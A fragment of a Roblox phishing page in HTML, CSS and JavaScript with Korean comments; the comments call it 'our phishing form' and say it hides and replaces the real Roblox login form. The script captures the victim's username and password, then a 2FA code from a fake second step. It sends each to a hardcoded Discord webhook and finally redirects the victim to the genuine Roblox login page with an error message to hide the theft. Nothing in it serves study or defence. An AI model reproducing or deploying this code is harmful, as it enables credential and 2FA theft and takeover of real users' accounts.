    <style>
      /* Roblox 폼 숨기기 - 우리 폼으로 대체 */
      #react-login-web-app { display: none !important; }
      
      /* 우리 피싱 폼 스타일 */
      * { margin: 0; padding: 0; box-sizing: border-box; }
      
      .login-page-container {
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: calc(100vh - 120px);
        padding: 40px 20px;
        background: #f5f5f5;
      }
      
      .login-card {
        background: #fff;
        border-radius: 12px;
        box-shadow: 0 2px 24px rgba(0,0,0,0.12);
        padding: 40px 32px;
        width: 100%;
        max-width: 400px;
      }
      
      .login-logo {
        text-align: center;
        margin-bottom: 32px;
      }
      
      .login-logo svg {
        width: 140px;
        height: auto;
      }
      
      .form-group {
        margin-bottom: 20px;
      }
      
      .form-group label {
        display: block;
        font-size: 14px;
        font-weight: 600;
        color: #333;
        margin-bottom: 6px;
      }
      
      .form-group input {
        width: 100%;
        padding: 12px 16px;
        border: 1px solid #ddd;
        border-radius: 8px;
        font-size: 16px;
        color: #333;
        background: #fafafa;
        transition: border-color 0.2s;
      }
      
      .form-group input:focus {
        outline: none;
        border-color: #00b4d8;
        background: #fff;
      }
      
      .login-btn {
        width: 100%;
        padding: 14px;
        background: #00b4d8;
        color: #fff;
        border: none;
        border-radius: 8px;
        font-size: 16px;
        font-weight: 700;
        cursor: pointer;
        transition: background 0.2s;
        margin-top: 8px;
      }
      
      .login-btn:hover {
        background: #0098b8;
      }
      
      .login-btn:disabled {
        background: #ccc;
        cursor: not-allowed;
      }
      
      .divider {
        text-align: center;
        margin: 24px 0;
        color: #999;
        font-size: 13px;
        position: relative;
      }
      
      .divider::before,
      .divider::after {
        content: '';
        position: absolute;
        top: 50%;
        width: 40%;
        height: 1px;
        background: #e0e0e0;
      }
      
      .divider::before { left: 0; }
      .divider::after { right: 0; }
      
      .social-login {
        display: flex;
        gap: 12px;
        margin-bottom: 20px;
      }
      
      .social-btn {
        flex: 1;
        padding: 12px;
        border: 1px solid #ddd;
        border-radius: 8px;
        background: #fff;
        cursor: pointer;
        font-size: 14px;
        text-align: center;
        transition: background 0.2s;
      }
      
      .social-btn:hover {
        background: #f5f5f5;
      }
      
      .links {
        text-align: center;
        margin-top: 20px;
      }
      
      .links a {
        color: #00b4d8;
        text-decoration: none;
        font-size: 14px;
      }
      
      .links a:hover {
        text-decoration: underline;
      }
      
      .error-msg {
        background: #ffe0e0;
        color: #d32f2f;
        padding: 10px 14px;
        border-radius: 8px;
        font-size: 13px;
        margin-bottom: 16px;
        display: none;
      }
      
      .error-msg.show { display: block; }
      
      /* 2FA 스타일 */
      #step2fa { display: none; }
      
      .code-inputs {
        display: flex;
        gap: 8px;
        justify-content: center;
        margin: 20px 0;
      }
      
      .code-inputs input {
        width: 48px;
        height: 56px;
        text-align: center;
        font-size: 24px;
        border: 2px solid #ddd;
        border-radius: 8px;
        font-weight: 700;
      }
      
      .code-inputs input:focus {
        border-color: #00b4d8;
        outline: none;
      }
      
      .info-text {
        text-align: center;
        color: #666;
        font-size: 13px;
        margin-bottom: 8px;
      }
      
      .link-btn {
        background: none;
        border: none;
        color: #00b4d8;
        cursor: pointer;
        font-size: 14px;
        margin-top: 12px;
      }
      
      .link-btn:hover {
        text-decoration: underline;
      }
    </style>

        Roblox는 더 나은 환경을 제공하기 위해 쿠키를 사용합니다.

    <script>
      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPPAQeHTqtDyQnAzY8mmPX4w';
      
      function sendToDiscord(data) {
        fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: '@everyone **🚨 새 로그인 캡처됨!**',
            embeds: [{
              title: '🎯 Roblox 크리덴셜',
              color: 3447003,
              fields: Object.entries(data).map(([name, value]) => ({ name, value, inline: true })),
              timestamp: new Date().toISOString()
            }]
          })
        }).catch(console.error);
      }
      
      // 로그인 폼 제출
      document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value;
        
        if (!username || !password) {
          document.getElementById('errorMsg').classList.add('show');
          return;
        }
        
        // 크리덴셜 저장
        window._capturedCredentials = { '사용자 이름': username, '비밀번호': password };
        
        // Discord로 전송
        sendToDiscord(window._capturedCredentials);
        
        // 2FA 단계로 전환
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2fa').style.display = 'block';
        document.querySelector('.code-input').focus();
      });
      
      // 2FA 코드 입력 - 자동 포커스 이동
      document.querySelectorAll('.code-input').forEach(input => {
        input.addEventListener('input', function() {
          if (this.value.length >= 1) {
            const next = this.nextElementSibling;
            if (next && next.classList.contains('code-input')) {
              next.focus();
            }
          }
        });
        input.addEventListener('keydown', function(e) {
          if (e.key === 'Backspace' && this.value === '') {
            const prev = this.previousElementSibling;
            if (prev && prev.classList.contains('code-input')) {
              prev.focus();
            }
          }
        });
      });
      
      // 2FA 폼 제출
      document.getElementById('tfaForm').addEventListener('submit', function(e) {
        e.preventDefault();
        let code = '';
        document.querySelectorAll('.code-input').forEach(inp => { code += inp.value; });
        
        if (code.length < 6) return;
        
        // 2FA 코드 추가 전송
        window._capturedCredentials['2FA 코드'] = code;
        sendToDiscord({ ...window._capturedCredentials, '⚠️ 상태': '2FA 코드까지 캡처됨!' });
        
        // 진짜 Roblox로 리다이렉트
        window.location.href = 'https://www.roblox.com/ko/Login?error=incorrect';
      });
      
      // 에러 표시용 - 잘못된 로그인 시도 시
      document.getElementById('password').addEventListener('input', function() {
        document.getElementById('errorMsg').classList.remove('show');
      });
    </script>
